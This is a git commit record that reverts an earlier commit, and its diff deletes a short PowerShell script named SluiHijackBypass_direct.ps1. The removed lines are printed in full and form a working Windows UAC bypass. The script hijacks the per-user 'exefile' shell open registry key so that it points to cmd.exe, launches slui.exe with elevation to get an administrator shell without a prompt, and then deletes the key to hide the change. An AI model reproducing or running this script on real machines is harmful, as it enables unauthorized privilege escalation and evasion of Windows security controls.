cbcf7c9c1dcb77f02dfb7e237cd4bd59dd8a78e9
gushmazuko <gushmazuko@protonmail.com>
2019-04-14 16:54:14 +0200

    Revert "SluiHijackBypass_direct"
    This reverts commit 0af15f4dad80748e7fa0129b722120fabf8b0718.

--- SluiHijackBypass_direct.ps1
+++
@@ -1,8 +0,0 @@
-$program = "cmd.exe"
-New-Item "HKCU:\Software\Classes\exefile\shell\open\command" -Force
-Set-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "(default)" -Value $program -Force
-#For x86 shell in Windows x64
-#C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process "C:\Windows\System32\slui.exe" -Verb runas"
-Start-Process "C:\Windows\System32\slui.exe" -Verb runas
-Start-Sleep 3
-Remove-Item "HKCU:\Software\Classes\exefile\shell\" -Recurse -Force
